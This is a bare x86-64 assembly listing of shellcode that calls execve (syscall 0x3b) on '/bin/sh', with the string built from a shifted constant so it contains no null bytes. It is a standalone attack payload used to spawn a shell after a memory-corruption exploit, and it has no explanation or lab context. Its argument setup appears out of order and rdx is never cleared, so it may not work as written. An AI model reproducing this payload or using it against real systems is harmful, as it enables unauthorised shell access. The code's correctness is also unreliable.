bits 64

xor rax, rax
mov al, 0x3b
mov rdi, 0x68732f6e69622fff
shr rdi, 0x8
push rdi
mov rdi, rsp
push rdi
push rdx
mov rsi, rsp
syscall
